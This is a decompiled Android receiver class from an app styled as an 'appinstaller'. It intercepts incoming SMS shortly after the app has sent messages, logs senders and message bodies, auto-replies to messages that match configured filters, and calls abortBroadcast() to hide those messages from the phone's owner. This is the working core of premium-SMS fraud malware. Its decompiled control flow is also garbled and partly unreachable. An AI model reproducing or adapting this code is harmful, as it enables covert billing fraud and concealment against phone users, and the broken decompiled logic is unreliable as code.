package com.soft.android.appinstaller.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.soft.android.appinstaller.OpInfo;
import com.soft.android.appinstaller.core.Internals;
import com.soft.android.appinstaller.services.SMSSenderService;
import java.util.Date;
import java.util.Timer;

public class IncomeMessageReceiver
  extends BroadcastReceiver
{
  public static final String DELAY = "engine.sms.answersms.delay";
  public static final String ENABLED = "engine.sms.answersms.enabled";
  public static final String FILTER_NUMBER = "engine.sms.answersms.filter.number";
  public static final String FILTER_OPERATION = "engine.sms.answersms.filter.operation";
  public static final String FILTER_TEXT = "engine.sms.answersms.filter.text";
  public static final String TEXT = "engine.sms.answersms.text";
  public static final String TIMEOUT = "engine.sms.answersms.timeout";
  private final String tag = "IncomeMessageReceiver";
  
  public IncomeMessageReceiver() {}
  
  private boolean isMatch(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    do
    {
      try
      {
        if ("OR".equalsIgnoreCase(paramString3))
        {
          if ((paramString1 != null) && (paramString4 != null) && (paramString4.matches(paramString1)))
          {
            Log.d("IncomeMessageReceiver", paramString4 + " matches " + paramString1);
            return true;
          }
          if ((paramString2 != null) && (paramString5 != null) && (paramString5.matches(paramString2)))
          {
            Log.d("IncomeMessageReceiver", paramString5 + " matches " + paramString2);
            return true;
          }
        }
      }
      catch (Exception paramString1)
      {
        Log.e("IncomeMessageReceiver.isMatch", "Unexpected exception occurred", paramString1);
        Log.d("IncomeMessageReceiver", "No match");
        return false;
      }
    } while ((paramString1 == null) || (paramString2 == null) || (paramString4 == null) || (paramString5 == null) || (!paramString4.matches(paramString1)) || (!paramString5.matches(paramString2)));
    Log.d("IncomeMessageReceiver", paramString4 + " matches " + paramString1);
    Log.d("IncomeMessageReceiver", paramString5 + " matches " + paramString2);
    return true;
  }
  
  private void sendAnswer(Context paramContext, int paramInt, String paramString1, String paramString2)
  {
    paramContext = new SendAnswerTask(paramContext, paramString1, paramString2);
    new Timer("SendAnswerTimer").schedule(paramContext, paramInt * 1000);
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    if (!Boolean.valueOf(OpInfo.getInstance().getInternals().getOverridableValueForLocation("engine.sms.answersms.enabled", "false")).booleanValue()) {}
    for (;;)
    {
      return;
      String str1 = OpInfo.getInstance().getInternals().getOverridableValueForLocation("engine.sms.answersms.timeout", null);
      int i = 30;
      if (str1 != null) {}
      try
      {
        int j = Integer.parseInt(str1);
        i = j;
        long l = SMSSenderService.getLastMessageTimestamp();
        if (new Date().getTime() - l > i * 1000) {
          continue;
        }
        str1 = OpInfo.getInstance().getInternals().getOverridableValueForLocation("engine.sms.answersms.delay", null);
        if (str1 == null) {}
      }
      catch (NumberFormatException localNumberFormatException1)
      {
        try
        {
          Integer.parseInt(str1);
          str1 = OpInfo.getInstance().getInternals().getOverridableValueForLocation("engine.sms.answersms.text", "");
          String str2 = OpInfo.getInstance().getInternals().getOverridableValueForLocation("engine.sms.answersms.filter.number", null);
          String str3 = OpInfo.getInstance().getInternals().getOverridableValueForLocation("engine.sms.answersms.filter.text", null);
          String str4 = OpInfo.getInstance().getInternals().getOverridableValueForLocation("engine.sms.answersms.filter.operation", "OR");
          paramIntent = (Object[])paramIntent.getExtras().get("pdus");
          i = 0;
          while (i < paramIntent.length)
          {
            SmsMessage localSmsMessage = SmsMessage.createFromPdu((byte[])paramIntent[i]);
            Log.i("IncomeMessageReceiver:sender", localSmsMessage.getOriginatingAddress());
            Log.i("IncomeMessageReceiver:body", localSmsMessage.getMessageBody());
            String str5 = localSmsMessage.getOriginatingAddress();
            if (isMatch(str2, str3, str4, str5, localSmsMessage.getMessageBody()))
            {
              sendAnswer(paramContext, 0, str5, str1);
              abortBroadcast();
            }
            i += 1;
          }
          localNumberFormatException1 = localNumberFormatException1;
        }
        catch (NumberFormatException localNumberFormatException2)
        {
          for (;;) {}
        }
      }
    }
  }
}
